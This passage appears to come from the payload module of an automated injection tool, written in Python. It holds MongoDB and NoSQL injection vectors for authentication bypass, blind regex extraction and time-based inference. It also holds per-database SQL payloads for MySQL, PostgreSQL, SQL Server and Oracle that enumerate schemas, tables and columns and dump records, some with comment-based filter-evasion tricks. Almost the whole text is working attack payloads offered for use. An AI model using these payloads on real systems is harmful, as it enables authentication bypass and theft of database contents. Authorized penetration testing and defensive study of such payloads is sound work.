            "title": "MongoDB Boolean-based bypass with $where tautology",
            "vector": "{ $where: '1 == 1' }",
            "dbms": "MongoDB",
        },
        {
            "title": "MongoDB Boolean-based bypass with $exists",
            "vector": "[$exists]=true",
            "dbms": "MongoDB",
        },
    ],
    "regex-based": [
        {
            "title": "MongoDB Regex-based length extraction",
            "vector": "[$regex]=.{25}",
            "dbms": "MongoDB",
        },
        {
            "title": "MongoDB Regex-based prefix match",
            "vector": "[$regex]=^adm",
            "dbms": "MongoDB",
        },
        {
            "title": "MongoDB Regex-based match any",
            "vector": "[$regex]=.*",
            "dbms": "MongoDB",
        },
    ],
    "aggregation": [
        {
            "title": "MongoDB Aggregation-based lookup injection",
            "vector": '''
            [
                {
                    "$lookup": {
                        "from": "users",
                        "as": "result",
                        "pipeline": [
                            { "$match": { "field": { "$regex": "^.*" } } }
                        ]
                    }
                }
            ]
            ''',
            "dbms": "MongoDB",
        },
    ],
    "time-based": [
        {
            "title": "MongoDB Time-based injection (sleep)",
            "vector": "function() { var x = [INFERENCE]; sleep(5000); }",
            "dbms": "MongoDB",
        },
    ],
    "code-injection": [
        {
            "title": "MongoDB Code Injection with $where",
            "vector": "{ $where: 'this.credits == this.debits' }",
            "dbms": "MongoDB",
        },
        {
            "title": "MongoDB Code Injection with $func",
            "vector": '{"$func": "var_dump"}',
            "dbms": "MongoDB",
        },
    ],
    "blind-injection": [
        {
            "title": "MongoDB Blind Injection with regex length",
            "vector": "[$regex]=.{25}",
            "dbms": "MongoDB",
        },
        {
            "title": "MongoDB Blind Injection with regex prefix",
            "vector": "[$regex]=^adm",
            "dbms": "MongoDB",
        },
    ],
    "arithmetic-bypass": [
        {
            "title": "MongoDB Arithmetic Bypass with tautology",
            "vector": "{ $where: '1 == 1' }",
            "dbms": "MongoDB",
        },
        {
            "title": "MongoDB Arithmetic Bypass with $gt",
            "vector": "{ $gt: '' }",
            "dbms": "MongoDB",
        },
        {
            "title": "MongoDB Arithmetic Bypass with $nin",
            "vector": "{ $nin: ['admin', 'test'] }",
            "dbms": "MongoDB",
        },
    ],
},
"NoSQL": {
    "extract-data": [
        {
            "title": "NoSQL Data Extraction with regex",
            "vector": "[$regex]=.{3}",
            "dbms": "NoSQL",
        },
        {
            "title": "NoSQL Data Extraction with prefix",
            "vector": "[$regex]=^m",
            "dbms": "NoSQL",
        },
    ],
    "authentication-bypass": [
        {
            "title": "NoSQL Authentication Bypass with $ne",
            "vector": "[$ne]=1",
            "dbms": "NoSQL",
        },
        {
            "title": "NoSQL Authentication Bypass with $exists",
            "vector": "[$exists]=true",
            "dbms": "NoSQL",
        },
    ],
    "operator-exploit": [
        {
            "title": "NoSQL Operator Exploit with $lt",
            "vector": "[$lt]=s",
            "dbms": "NoSQL",
        },
        {
            "title": "NoSQL Operator Exploit with $gt",
            "vector": "[$gt]=s",
            "dbms": "NoSQL",
        },
    ],
    "php-arbitrary-function-execution": [
        {
            "title": "NoSQL PHP Arbitrary Function Execution",
            "vector": '{"$func": "var_dump"}',
            "dbms": "NoSQL",
        },
    ],
},
}

PAYLOADS_DBS_COUNT = {
    "MySQL": [
        "(SELECT COUNT(*)FROM(INFORMATION_SCHEMA.SCHEMATA))",
        "(/*!50000SELECT*/ COUNT(*)/*!50000FROM*//*!50000(INFORMATION_SCHEMA.SCHEMATA)*/)",
        "(/*!50000SELECT*/ COUNT(*)/*!50000FROM*/(/*!50000INFORMATION_SCHEMA*/./*!50000SCHEMATA*/))",
    ],
    "PostgreSQL": [
        "(SELECT COUNT(DISTINCT(schemaname)) FROM pg_tables)",
        "(SELECT COUNT(TABLE_SCHEMA) FROM INFORMATION_SCHEMA.TABLES GROUP BY TABLE_SCHEMA)",
        "(SELECT COUNT(DISTINCT(schemaname)) FROM pg_tables ORDER by SCHEMANAME)",
        "(SELECT COUNT(SCHEMANAME) FROM pg_tables GROUP BY SCHEMANAME)",
        "(SELECT COUNT(datname) FROM pg_database)",
    ],
    "Microsoft SQL Server": [
        "(SELECT LTRIM(STR(COUNT(name))) FROM master..sysdatabases)",
        "(SELECT COUNT(name) FROM master..sysdatabases)",
        "(SELECT LTRIM(STR(COUNT(*))) FROM sys.databases)",
        "(SELECT COUNT(*) FROM sys.databases)",
        "(SELECT LTRIM(STR(COUNT(*))) FROM sys.databases)",
        "(SELECT CAST(COUNT(name) AS NVARCHAR(4000)) FROM master..sysdatabases)",
        "(SELECT ISNULL(CAST(COUNT(name) AS NVARCHAR(4000)),CHAR(32)) FROM master..sysdatabases)",
    ],
    "Oracle": [
        "(SELECT COUNT(DISTINCT(OWNER)) FROM SYS.ALL_TABLES)",
    ],
}

PAYLOADS_DBS_NAMES = {
    "MySQL": [
        "(SELECT SCHEMA_NAME FROM(INFORMATION_SCHEMA.SCHEMATA)LIMIT 0,1)",
        "(SELECT IFNULL(SCHEMA_NAME,0x20) FROM(INFORMATION_SCHEMA.SCHEMATA)LIMIT 0,1)",
        "(SELECT CONCAT(SCHEMA_NAME)FROM(INFORMATION_SCHEMA.SCHEMATA)LIMIT 0,1)",
        "(SELECT CONCAT/**_**/(SCHEMA_NAME)FROM(INFORMATION_SCHEMA.SCHEMATA)LIMIT 0,1)",
        "(SELECT CONCAT(SCHEMA_NAME)FROM(INFORMATION_SCHEMA.SCHEMATA)LIMIT 0,1)",
        "(SELECT CONCAT_WS(0x28,0x7e,SCHEMA_NAME)FROM(INFORMATION_SCHEMA.SCHEMATA)LIMIT 0,1)",
        "(/*!SELECT*/ CONCAT_WS(0x28,0x7e,/*!SCHEMA_NAME*/)FROM(/*!INFORMATION_SCHEMA*/./**_**//*!SCHEMATA*/)LIMIT/**_**/0,1)",
    ],
    "PostgreSQL": [
        "(SELECT DISTINCT(schemaname) FROM pg_tables ORDER BY schemaname OFFSET 0 LIMIT 1)",
        "(SELECT CONCAT(TABLE_SCHEMA) FROM INFORMATION_SCHEMA.TABLES GROUP BY TABLE_SCHEMA OFFSET 0 LIMIT 1)",
        "(SELECT TABLE_SCHEMA FROM INFORMATION_SCHEMA.TABLES GROUP BY TABLE_SCHEMA OFFSET 0 LIMIT 1)",
        "(SELECT SCHEMANAME FROM pg_tables GROUP BY SCHEMANAME OFFSET 0 LIMIT 1)",
        "(SELECT CONCAT(SCHEMANAME) FROM pg_tables GROUP BY SCHEMANAME OFFSET 0 LIMIT 1)",
        "(SELECT datname FROM pg_database ORDER BY datname OFFSET 0 LIMIT 1)",
    ],
    "Microsoft SQL Server": [
        "(SELECT TOP 1 name FROM master..sysdatabases WHERE name NOT IN (SELECT TOP 0 name FROM master..sysdatabases ORDER BY name) ORDER BY name)",
        "(SELECT TOP 1 CAST(name AS NVARCHAR(4000)) FROM master..sysdatabases WHERE CAST(name AS NVARCHAR(4000)) NOT IN (SELECT TOP 0 CAST(name AS NVARCHAR(4000)) FROM master..sysdatabases ORDER BY name) ORDER BY name)",
        "(SELECT TOP 1 SUBSTRING((ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32))),1,1024) FROM master..sysdatabases WHERE ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 3 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysdatabases ORDER BY name) ORDER BY name)",
        "(SELECT DB_NAME(0))",
    ],
    "Oracle": [
        "(SELECT OWNER FROM (SELECT OWNER,ROWNUM AS LIMIT FROM (SELECT DISTINCT(OWNER) FROM SYS.ALL_TABLES)) WHERE LIMIT=1)"
    ],
}

PAYLOADS_TBLS_COUNT = {
    "MySQL": [
        "(SELECT+COUNT(*)FROM(INFORMATION_SCHEMA.TABLES)WHERE(TABLE_SCHEMA={db}))",
        "(SELECT COUNT(*)FROM(INFORMATION_SCHEMA.TABLES)WHERE(TABLE_SCHEMA LIKE {db}))",
        "(SELECT COUNT(*)FROM(INFORMATION_SCHEMA.TABLES)WHERE(TABLE_SCHEMA IN({db})))",
        "(/*!50000SELECT*/ COUNT(*)/*!50000FROM*/(/*!50000INFORMATION_SCHEMA*/./*!50000TABLES*/)/*!50000WHERE*/(TABLE_SCHEMA={db}))",
    ],
    "PostgreSQL": [
        "(SELECT COUNT(TABLENAME)::text FROM pg_tables WHERE SCHEMANAME={db})",
        "(SELECT COUNT(TABLENAME)::text FROM pg_tables WHERE SCHEMANAME LIKE '{db}')",
        "(SELECT COUNT(TABLENAME)::text FROM pg_tables WHERE SCHEMANAME IN ({db}))",
        "(SELECT COUNT(*) FROM pg_namespace,pg_type,pg_attribute b JOIN pg_class a ON a.oid=b.attrelid WHERE a.relnamespace=pg_namespace.oid AND pg_type.oid=b.atttypid AND attnum>0 AND nspname={db} AND a.relname={tbl})",
    ],
    "Microsoft SQL Server": [
        "(SELECT LTRIM(STR(COUNT(name))) FROM {db}..sysobjects WHERE xtype IN (CHAR(117),CHAR(118)))",
        "(SELECT LTRIM(STR(COUNT(name))) FROM {db}..sysobjects WHERE xtype IN ('U','V'))",
        "(SELECT LTRIM(STR(COUNT(TABLE_NAME))) FROM information_schema.tables WHERE table_catalog={db})",
        "(SELECT COUNT(name) FROM {db}..sysobjects WHERE xtype IN (CHAR(117),CHAR(118)))",
        "(SELECT COUNT(name) FROM {db}..sysobjects WHERE xtype IN ('U','V'))",
        "(SELECT COUNT(TABLE_NAME) FROM information_schema.tables WHERE table_catalog={db})",
        "(SELECT CAST(COUNT(name) AS NVARCHAR(4000)) FROM {db}..sysobjects WHERE xtype IN (CHAR(117),CHAR(118)))",
        "(SELECT CAST(COUNT(name) AS NVARCHAR(4000)) FROM {db}..sysobjects WHERE xtype IN ('U','V'))",
        "(SELECT CAST(COUNT(TABLE_NAME) AS NVARCHAR(4000)) FROM information_schema.tables WHERE table_catalog={db})",
        "(SELECT CAST(COUNT(name) AS NVARCHAR(4000)) FROM {db}..sysobjects WHERE xtype=CHAR(85))",
        "(SELECT CAST(COUNT(name) AS NVARCHAR(4000)) FROM {db}..sysobjects WHERE xtype='U')",
        "(SELECT LTRIM(STR(count(*)))FROM information_schema.tables)",
        "(SELECT LTRIM(STR(COUNT(*))) FROM {db}..sysobjects)",
    ],
    "Oracle": ["(SELECT COUNT(TABLE_NAME) FROM SYS.ALL_TABLES WHERE OWNER={db})"],
}

PAYLOADS_TBLS_NAMES = {
    "MySQL": [
        "(SELECT TABLE_NAME FROM(INFORMATION_SCHEMA.TABLES)WHERE(TABLE_SCHEMA={db})LIMIT 0,1)",
        "(SELECT CONCAT(TABLE_NAME)FROM(INFORMATION_SCHEMA.TABLES)WHERE(TABLE_SCHEMA={db})LIMIT 0,1)",
        "(SELECT CONCAT/**_**/(TABLE_NAME)FROM(INFORMATION_SCHEMA.TABLES)WHERE(TABLE_SCHEMA={db})LIMIT 0,1)",
        "(SELECT CONCAT(TABLE_NAME)FROM(INFORMATION_SCHEMA.TABLES)WHERE(TABLE_SCHEMA LIKE {db})LIMIT 0,1)",
        "(SELECT CONCAT(TABLE_NAME)FROM(INFORMATION_SCHEMA.TABLES)WHERE(TABLE_SCHEMA IN/**_**/({db}))LIMIT 0,1)",
        "(SELECT CONCAT_WS(0x28,0x7e,TABLE_NAME)FROM(INFORMATION_SCHEMA.TABLES)WHERE(TABLE_SCHEMA={db})LIMIT 0,1)",
        "(/*!SELECT*/ CONCAT_WS(0x28,0x7e,/*!TABLE_NAME*/)FROM(/*!INFORMATION_SCHEMA*/./**_**//*!TABLES*/)/*!50000WHERE*/(TABLE_SCHEMA={db})LIMIT/**_**/0,1)",
    ],
    "PostgreSQL": [
        "(SELECT TABLENAME::text FROM pg_tables WHERE SCHEMANAME={db} OFFSET 0 LIMIT 1)",
        "(SELECT TABLENAME::text FROM pg_tables WHERE SCHEMANAME LIKE {db} OFFSET 0 LIMIT 1)",
        "(SELECT TABLENAME::text FROM pg_tables WHERE SCHEMANAME IN({db}) OFFSET 0 LIMIT 1)",
        "(SELECT TABLE_NAME::text FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA={db} OFFSET 0 LIMIT 1)",
        "(SELECT TABLE_NAME::text FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA LIKE {db} OFFSET 0 LIMIT 1)",
        "(SELECT TABLE_NAME::text FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA IN({db}) OFFSET 0 LIMIT 1)",
    ],
    "Microsoft SQL Server": [
        "(SELECT TOP 1 {db}..sysusers.name+CHAR(46)+{db}..sysobjects.name AS table_name FROM {db}..sysobjects INNER JOIN {db}..sysusers ON {db}..sysobjects.uid={db}..sysusers.uid WHERE {db}..sysobjects.xtype IN (CHAR(117),CHAR(118)) AND {db}..sysusers.name+CHAR(46)+{db}..sysobjects.name NOT IN (SELECT TOP 0 {db}..sysusers.name+'.'+{db}..sysobjects.name AS table_name FROM {db}..sysobjects INNER JOIN {db}..sysusers ON {db}..sysobjects.uid={db}..sysusers.uid WHERE {db}..sysobjects.xtype IN (CHAR(117),CHAR(118)) ORDER BY {db}..sysusers.name+'.'+{db}..sysobjects.name)ORDER BY {db}..sysusers.name+'.'+{db}..sysobjects.name)",
        "(SELECT TOP 1 {db}..sysusers.name+'.'+{db}..sysobjects.name AS table_name FROM {db}..sysobjects INNER JOIN {db}..sysusers ON {db}..sysobjects.uid={db}..sysusers.uid WHERE {db}..sysobjects.xtype IN ('u','v') AND {db}..sysusers.name+'.'+{db}..sysobjects.name NOT IN (SELECT TOP 0 {db}..sysusers.name+'.'+{db}..sysobjects.name AS table_name FROM {db}..sysobjects INNER JOIN {db}..sysusers ON {db}..sysobjects.uid={db}..sysusers.uid WHERE {db}..sysobjects.xtype IN ('u','v') ORDER BY {db}..sysusers.name+'.'+{db}..sysobjects.name)ORDER BY {db}..sysusers.name+'.'+{db}..sysobjects.name)",
        "(SELECT TOP 1 TABLE_SCHEMA+CHAR(46)+TABLE_NAME FROM information_schema.tables WHERE table_catalog={db} AND TABLE_SCHEMA+CHAR(46)+TABLE_NAME NOT IN (SELECT TOP 0 TABLE_SCHEMA+CHAR(46)+TABLE_NAME FROM information_schema.tables WHERE table_catalog={db} ORDER BY TABLE_SCHEMA+'.'+TABLE_NAME) ORDER BY TABLE_SCHEMA+'.'+TABLE_NAME)",
        "(SELECT TOP 1 TABLE_SCHEMA+'.'+TABLE_NAME FROM information_schema.tables WHERE table_catalog={db} AND TABLE_SCHEMA+'.'+TABLE_NAME NOT IN (SELECT TOP 0 TABLE_SCHEMA+'.'+TABLE_NAME FROM information_schema.tables WHERE table_catalog={db} ORDER BY TABLE_SCHEMA+'.'+TABLE_NAME)ORDER BY TABLE_SCHEMA+'.'+TABLE_NAME)",
        "(SELECT TOP 1 name FROM {db}..sysobjects WHERE xtype IN (CHAR(117),CHAR(118)) AND name NOT IN (SELECT TOP 0 name FROM {db}..sysobjects WHERE xtype IN (CHAR(117),CHAR(118)) ORDER BY name) ORDER BY name)",
        "(SELECT TOP 1 name FROM {db}..sysobjects WHERE xtype IN ('U','V') AND name NOT IN (SELECT TOP 0 name FROM {db}..sysobjects WHERE xtype IN ('U','V') ORDER BY name) ORDER BY name)",
        "(SELECT TOP 1 TABLE_NAME FROM information_schema.tables WHERE table_catalog={db} AND TABLE_NAME NOT IN (SELECT TOP 0 TABLE_NAME FROM information_schema.tables WHERE table_catalog={db} ORDER BY table_name)ORDER BY table_name)",
        "(SELECT TOP 1 name FROM {db}..sysobjects WHERE xtype=CHAR(85) AND name NOT IN (SELECT TOP 0 name FROM {db}..sysobjects WHERE xtype=CHAR(85) ORDER BY name) ORDER BY name)",
        "(SELECT TOP 1 name FROM {db}..sysobjects WHERE xtype='U' AND name NOT IN (SELECT TOP 0 name FROM {db}..sysobjects WHERE xtype='U' ORDER BY name) ORDER BY name)",
        "(SELECT TOP 1 TABLE_NAME from information_schema.tables)",
        "(SELECT TOP 1 name FROM {db}..sysobjects WHERE xtype='U')"
    ],
    "Oracle": [
        "(SELECT TABLE_NAME FROM (SELECT TABLE_NAME,ROWNUM AS LIMIT FROM SYS.ALL_TABLES WHERE OWNER={db}) WHERE LIMIT=1)"
    ],
}

PAYLOADS_COLS_COUNT = {
    "MySQL": [
        "(SELECT COUNT(*)FROM(INFORMATION_SCHEMA.COLUMNS)WHERE(TABLE_SCHEMA={db})AND(TABLE_NAME={tbl}))",
        "(SELECT COUNT(*)FROM(INFORMATION_SCHEMA.COLUMNS)WHERE(TABLE_SCHEMA LIKE {db})AND(TABLE_NAME LIKE {tbl}))",
        "(SELECT COUNT(*)FROM(INFORMATION_SCHEMA.COLUMNS)WHERE(TABLE_SCHEMA IN({db}))AND(TABLE_NAME IN({tbl})))",
        "(/*!50000SELECT*/ COUNT(*)/*!50000FROM*/(/*!50000INFORMATION_SCHEMA*/./*!50000COLUMNS*/)/*!50000WHERE*/(TABLE_SCHEMA={db})AND(/*!50000TABLE_NAME*/={tbl}))",
    ],
    "PostgreSQL": [
        "(SELECT COUNT(COLUMN_NAME)::text FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA LIKE {db} AND TABLE_NAME LIKE {tbl})",
        "(SELECT COUNT(COLUMN_NAME)::text FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA={db} AND TABLE_NAME={tbl})",
        "(SELECT COUNT(COLUMN_NAME)::text FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA IN({db}) AND TABLE_NAME IN({tbl}))",
        "(SELECT COUNT(*) FROM pg_namespace,pg_type,pg_attribute b JOIN pg_class a ON a.oid=b.attrelid WHERE a.relnamespace=pg_namespace.oid AND pg_type.oid=b.atttypid AND attnum>0 AND nspname={db} AND a.relname={tbl})",
    ],
    "Microsoft SQL Server": [
        "(SELECT LTRIM(STR(COUNT(name))) FROM {db}..syscolumns WHERE id=(SELECT id FROM {db}..sysobjects WHERE name={tbl}))",
        "(SELECT LTRIM(STR(COUNT(name))) FROM {db}..syscolumns WHERE id=(SELECT id FROM {db}..sysobjects WHERE name={tbl}))",
        "(SELECT LTRIM(STR(COUNT(COLUMN_NAME))) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_catalog={db} AND table_name={tbl})",
        "(SELECT COUNT(name) FROM {db}..syscolumns WHERE id=(SELECT id FROM {db}..sysobjects WHERE name={tbl}))",
        "(SELECT COUNT(name) FROM {db}..syscolumns WHERE id=(SELECT id FROM {db}..sysobjects WHERE name={tbl}))",
        "(SELECT COUNT(COLUMN_NAME) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_catalog={db} AND table_name={tbl})",
        "(SELECT CAST(COUNT(name) AS NVARCHAR(4000)) FROM {db}..syscolumns WHERE id=(SELECT id FROM {db}..sysobjects WHERE name={tbl}))",
        "(SELECT CAST(COUNT(name) AS NVARCHAR(4000)) FROM {db}..syscolumns WHERE id=(SELECT id FROM {db}..sysobjects WHERE name={tbl}))",
        "(SELECT CAST(COUNT(COLUMN_NAME) AS NVARCHAR(4000)) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_catalog={db} AND table_name={tbl})",
        "(SELECT CAST(COUNT(name) AS NVARCHAR(4000)) FROM {db}..syscolumns WHERE id=(SELECT id FROM {db}..sysobjects WHERE name={tbl}))",
        "(SELECT CAST(COUNT(name) AS NVARCHAR(4000)) FROM {db}..syscolumns WHERE id=(SELECT id FROM {db}..sysobjects WHERE name={tbl}))",
        "(SELECT LTRIM(STR(count(*)))FROM information_schema.columns)",
        "(SELECT LTRIM(STR(COUNT(*))) FROM {db}..syscolumns)",
    ],
    "Oracle": [
        "(SELECT COUNT(COLUMN_NAME) FROM SYS.ALL_TAB_COLUMNS WHERE OWNER={db} AND TABLE_NAME={tbl})"
    ],
}

PAYLOADS_COLS_NAMES = {
    "MySQL": [
        "(SELECT COLUMN_NAME FROM(INFORMATION_SCHEMA.COLUMNS)WHERE(TABLE_SCHEMA={db})AND(TABLE_NAME={tbl})LIMIT 0,1)",
        "(SELECT CONCAT(COLUMN_NAME)FROM(INFORMATION_SCHEMA.COLUMNS)WHERE(TABLE_SCHEMA={db})AND(TABLE_NAME={tbl})LIMIT 0,1)",
        "(SELECT CONCAT/**_**/(COLUMN_NAME)FROM(INFORMATION_SCHEMA.COLUMNS)WHERE(TABLE_SCHEMA={db})AND(TABLE_NAME={tbl})LIMIT 0,1)",
        "(SELECT CONCAT(COLUMN_NAME)FROM(INFORMATION_SCHEMA.COLUMNS)WHERE(TABLE_SCHEMA LIKE {db})AND(TABLE_NAME LIKE {tbl})LIMIT 0,1)",
        "(SELECT CONCAT/**_**/(COLUMN_NAME)FROM(INFORMATION_SCHEMA.COLUMNS)WHERE(TABLE_SCHEMA LIKE {db})AND(TABLE_NAME LIKE {tbl})LIMIT 0,1)",
        "(SELECT CONCAT(COLUMN_NAME)FROM(INFORMATION_SCHEMA.COLUMNS)WHERE(TABLE_SCHEMA IN/**_**/({db}))AND(TABLE_NAME IN({tbl}))LIMIT 0,1)",
        "(SELECT CONCAT/**_**/(COLUMN_NAME)FROM(INFORMATION_SCHEMA.COLUMNS)WHERE(TABLE_SCHEMA IN/**_**/({db}))AND(TABLE_NAME IN({tbl}))LIMIT 0,1)",
        "(SELECT CONCAT_WS(0x28,0x7e,COLUMN_NAME)FROM(INFORMATION_SCHEMA.COLUMNS)WHERE(TABLE_SCHEMA={db})AND(/*!50000TABLE_NAME*/={tbl})LIMIT 0,1)",
        "(/*!SELECT*/ CONCAT_WS(0x28,0x7e,/*!COLUMN_NAME*/)FROM(/*!INFORMATION_SCHEMA*/./**_**//*!COLUMNS*/)/*!50000WHERE*/(TABLE_SCHEMA={db})AND(/*!50000TABLE_NAME*/={tbl})LIMIT/**_**/0,1)",
    ],
    "PostgreSQL": [
        "(SELECT COLUMN_NAME::text FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA LIKE {db} AND TABLE_NAME LIKE {tbl} OFFSET 0 LIMIT 1)",
        "(SELECT COLUMN_NAME::text FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA={db} AND TABLE_NAME={tbl} OFFSET 0 LIMIT 1)",
        "(SELECT COLUMN_NAME::text FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA IN({db}) AND TABLE_NAME IN({tbl}) OFFSET 0 LIMIT 1)",
        "(SELECT CONCAT(COLUMN_NAME)::text FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA IN({db}) AND TABLE_NAME IN({tbl}) OFFSET 0 LIMIT 1)",
        "(SELECT attname FROM pg_namespace,pg_type,pg_attribute b JOIN pg_class a ON a.oid=b.attrelid WHERE a.relnamespace=pg_namespace.oid AND pg_type.oid=b.atttypid AND attnum>0 AND nspname={db} AND a.relname={tbl} OFFSET 0 LIMIT 1)",
    ],
    "Microsoft SQL Server": [
    "(SELECT TOP 1 {db}..syscolumns.name FROM {db}..syscolumns, {db}..sysobjects WHERE {db}..syscolumns.id={db}..sysobjects.id AND {db}..sysobjects.name={tbl} AND {db}..syscolumns.name NOT IN (SELECT TOP 0 {db}..syscolumns.name FROM {db}..syscolumns, {db}..sysobjects WHERE {db}..syscolumns.id={db}..sysobjects.id AND {db}..sysobjects.name={tbl}))",
    "(SELECT TOP 1 {db}..syscolumns.name FROM {db}..syscolumns, {db}..sysobjects WHERE {db}..syscolumns.id={db}..sysobjects.id AND {db}..sysobjects.name={tbl} AND {db}..syscolumns.name NOT IN (SELECT TOP 0 {db}..syscolumns.name FROM {db}..syscolumns, {db}..sysobjects WHERE {db}..syscolumns.id={db}..sysobjects.id AND {db}..sysobjects.name={tbl}))",
    "(SELECT TOP 1 name FROM {db}..syscolumns WHERE 1=1)",
    ],
    "Oracle": [
        "(SELECT COLUMN_NAME FROM (SELECT COLUMN_NAME,ROWNUM AS LIMIT FROM SYS.ALL_TAB_COLUMNS WHERE OWNER={db} AND TABLE_NAME={tbl}) WHERE LIMIT=1)",
    ],
}

PAYLOADS_RECS_COUNT = {
    "MySQL": [
        "(SELECT COUNT(*) FROM {db}.{tbl})",
        "(SELECT COUNT(*) FROM ({db}.{tbl}))",
        "(SELECT IFNULL(TABLE_ROWS, 0) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA={db} AND TABLE_NAME={tbl})",
        "(SELECT IFNULL(TABLE_ROWS, 0) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA LIKE {db} AND TABLE_NAME LIKE {tbl})",
        "(SELECT IFNULL(TABLE_ROWS, 0) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA IN({db}) AND TABLE_NAME IN({tbl}))",
    ],
    "PostgreSQL": [
        "(SELECT COUNT(*) FROM {db}.{tbl})",
    ],
    "Microsoft SQL Server": [
        "(SELECT LTRIM(STR(COUNT(*))) FROM {tbl})",
        "(SELECT LTRIM(STR(COUNT(DISTINCT({col})))) FROM {tbl})",
        "(SELECT COUNT(*) FROM {db}.{tbl})",
    ],
    "Oracle": ["(SELECT COUNT(*) FROM {tbl})"],
}

PAYLOADS_RECS_DUMP = {
    "MySQL": [
        "(SELECT {col} FROM {db}.{tbl} LIMIT 0,1)",
        "(SELECT IFNULL({col},0x20) FROM {db}.{tbl} LIMIT 0,1)",
        "(SELECT CONCAT({col}) FROM {db}.{tbl} LIMIT 0,1)",
        "(SELECT CONCAT/**_**/({col}) FROM {db}.{tbl} LIMIT 0,1)",
        "(SELECT/**/CONCAT({col})FROM/**/{db}.{tbl}/**/LIMIT/**_**/0,1)",
        "(/*!50000SELECT*/ CONCAT/**_**/(/*!50000{col}*/)/*!50000FROM*/ /*!50000{db}.{tbl}*/ LIMIT 0,1)",
        "(SELECT CONCAT_WS(0x28,0x7e,{col}) FROM {db}.{tbl} LIMIT 0,1)",
    ],
    "PostgreSQL": [
        "(SELECT {col}::text FROM {db}.{tbl} OFFSET 0 LIMIT 1)",
        "(SELECT CONCAT({col})::text FROM {db}.{tbl} OFFSET 0 LIMIT 1)",
    ],
    "Microsoft SQL Server": [
        "(SELECT {col} FROM (SELECT {col},ROW_NUMBER() OVER (ORDER BY (SELECT 1)) AS LIMIT FROM {tbl}) x WHERE LIMIT=1)",
        "(SELECT TOP 1 {col} FROM {tbl} WHERE {col} NOT IN (SELECT TOP 0 {col} FROM {tbl}))",
        "(SELECT TOP 1 {col} FROM {tbl} WHERE 1=1)",
    ],
    "Oracle": [
        "(SELECT {col} FROM (SELECT {col},ROWNUM AS LIMIT FROM {tbl}) WHERE LIMIT=1)",
        "(SELECT {col} FROM (SELECT qq.*,ROWNUM AS LIMIT FROM {tbl} qq ORDER BY ROWNUM) WHERE LIMIT=1)",
    ],
}

TEMPLATE_INJECTED_MESSAGE = """
    Type: {PAYLOAD_TYPE}
    Title: {TITLE}
    Payload: {PAYLOAD}
"""
